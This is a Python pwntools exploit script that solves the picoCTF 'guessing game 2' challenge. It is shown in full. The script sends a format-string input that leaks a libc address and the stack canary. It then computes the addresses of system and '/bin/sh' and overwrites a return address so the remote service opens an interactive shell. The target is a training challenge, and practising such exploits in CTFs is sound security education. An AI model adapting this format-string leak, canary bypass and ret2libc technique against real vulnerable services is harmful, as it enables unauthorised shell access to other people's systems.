# picoCTF-guessing-game-2-exploit.py
# by Aidan Wech (ahwech)
# nc jupiter.challenges.picoctf.org 18263

from pwn import *

def main():
    # connection variables
    host = "jupiter.challenges.picoctf.org"
    port = 18263

    # variables
    guess = -3727                               # correct number that we need to guess to go to win()
    canary_offset = 512                         # offset to canary location in memory from our string
    win_ret_offset = 528                        # offset to win()'s return address in memory from our string
    io_stdin_format_arg = 2                     # format string location of _IO_2_1_stdin_
    stack_canary_format_arg = 135               # format string location of stack canary
    io_stdin_offset = 0x1d55c0                  # _IO_2_1_stdin_ libc offset
    system_offset = 0x3cf10                     # system libc offset
    bin_sh_offset = 0x17b9db                    # "/bin/sh" libc offset

    # connect to instance
    p = remote(host, port)

    # bypass ASLR and canary check by obtaining _IO_2_1_stdin_ and stack canary through leak
    p.recvuntil(b"guess?\n", timeout=1)
    p.sendline(f"{guess}".encode())
    p.recvuntil(b"Name? ", timeout=1)
    p.sendline(f"|%{io_stdin_format_arg}$p|%{stack_canary_format_arg}$p".encode()) 
    leak = p.recvline(timeout=1).decode().rstrip("\n").split("|")
    io_stdin = int(leak[1][2:], 16)
    stack_canary = int(leak[2][2:], 16)

    # calculate system and "/bin/sh" using _IO_2_1_stdin_
    # libc offsets are from "libc6-i386_2.27-3ubuntu1.6_amd64" and found using "libc.rip"
    libc = io_stdin - io_stdin_offset
    system = libc + system_offset
    bin_sh = libc + bin_sh_offset

    # shell payload
    payload = flat(
        {
            canary_offset: p32(stack_canary),   # keep the canary intact to bypass canary check
            win_ret_offset: p32(system)         # overwrite win()'s return address with system
        },
        "AAAA",                                 # dummy return address
        p32(bin_sh)                             # &"/bin/sh" becomes arg1
    )

    # deliver payload
    p.recvuntil(b"guess?\n", timeout=1)
    p.sendline(f"{guess}".encode())
    p.recvuntil(b"Name? ", timeout=1)
    p.sendline(payload)
    p.recvuntil(b"\n\n", timeout=1)

    # interact with shell
    p.interactive()

if __name__ == "__main__":
    main()